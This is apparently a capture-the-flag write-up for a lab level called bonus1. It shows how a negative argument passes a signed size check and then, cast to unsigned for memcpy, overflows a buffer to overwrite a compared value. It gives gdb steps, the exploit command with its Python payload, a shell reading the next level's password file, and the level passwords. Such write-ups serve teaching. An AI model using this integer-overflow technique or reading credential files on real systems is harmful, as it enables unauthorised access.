# Bonus1 - Exploit signed / unsigned types to bypass checks

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| bonus1 | `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9` |
| bonus2 | `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute the binary

```shell
~/bonus1
> Segmentation fault (core dumped)

~/bonus1 a
```

It takes a least one parameter.

Lets debug the binary

```shell
(gdb) info functions
0x08048424  main
```

See our assembly interpretation in [source file](../source.c)

The usage is: "./bonus1 (number < 10) string"

We can see the number is evaluated twice. It has to be smaller than 10.
Then this number is multiplied by 4.

The second comparison, just after a `memcpy`, checks the same number equals 1464814662.

The number is stored in `esp+0x3c` and the `memcpy` destination is stored in `esp+0x14`

```shell
gdb-peda$ p 0x3c - 0x14
  $2 = 0x28
gdb-peda$ p/d0x28
  $3 = 40
```

It means there is 40 bits between them.
Unfortunately, we can not write directly more than 36 bytes (9 \* 4) in `memcpy`.

To overwrite the number, we have to write 40 characters + 4 bits for the value `0x574f4c46` => 44 bits.

As `memcpy` takes a `size_t` (unsigned) and `atoi` returns an int, we can use negatives values, to pass the first comparison and then override the number value.

We need 44 chars. Lets cast -44 as unsigned int and divide by 4 the result.

```shell
gdb-peda$ p /u -44
  $4 = 4294967252
gdb-peda$ p /d 4294967252 / 4
  $5 = 1073741813
```

Finally we can build the exploit and get the pass.

```shell
~/bonus1 -1073741813 `python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`
$ cat /home/user/bonus2/.pass
  579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

---

## Sources

### C

- [Man atoi](https://linux.die.net/man/3/atoi)
- [Man memcpy](https://linux.die.net/man/3/memcpy)
- [Man execl](https://linux.die.net/man/3/execl)
